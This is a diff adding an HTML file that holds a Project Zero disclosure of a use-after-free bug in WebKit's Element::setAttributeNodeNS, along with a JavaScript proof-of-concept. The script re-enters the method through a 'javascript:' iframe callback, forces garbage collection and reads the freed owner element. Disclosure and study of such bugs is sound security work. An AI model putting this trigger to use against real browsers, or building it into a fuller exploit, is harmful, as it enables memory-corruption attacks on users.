@@ -1,0 +1,55 @@
+<!--
+Source: https://bugs.chromium.org/p/project-zero/issues/detail?id=1187
+
+Here's a snippet of Element::setAttributeNodeNS.
+
+ExceptionOr<RefPtr<Attr>> Element::setAttributeNodeNS(Attr& attrNode)
+{
+...
+    setAttributeInternal(index, attrNode.qualifiedName(), attrNode.value(), NotInSynchronizationOfLazyAttribute);
+
+    attrNode.attachToElement(*this);
+    treeScope().adoptIfNeeded(attrNode);
+    ensureAttrNodeListForElement(*this).append(&attrNode);
+
+    return WTFMove(oldAttrNode);
+}
+
+|setAttributeInternal| may execute arbitrary JavaScript. If |setAttributeNodeNS| is called again in |setAttributeInternal|, there will be two |Attr| that has the same owner element and the same name after the first |setAttributeNodeNS| call. One of the |Attr|s will hold the raw pointer of the owner element even if the owner element is freed.
+
+
+PoC:
+-->
+
+<body>
+<script>
+
+function gc() {
+    for (let i = 0; i < 0x40; i++) {
+        new ArrayBuffer(0x1000000);
+    }
+}
+
+window.callback = () => {
+    window.callback = null;
+
+    d.setAttributeNodeNS(src);
+    f.setAttributeNodeNS(document.createAttribute('src'));
+};
+
+let src = document.createAttribute('src');
+src.value = 'javascript:parent.callback()';
+
+let d = document.createElement('div');
+let f = document.body.appendChild(document.createElement('iframe'));
+f.setAttributeNodeNS(src);
+f.remove();
+f = null;
+src = null;
+
+gc();
+
+alert(d.attributes[0].ownerElement);
+
+</script>
+</body>
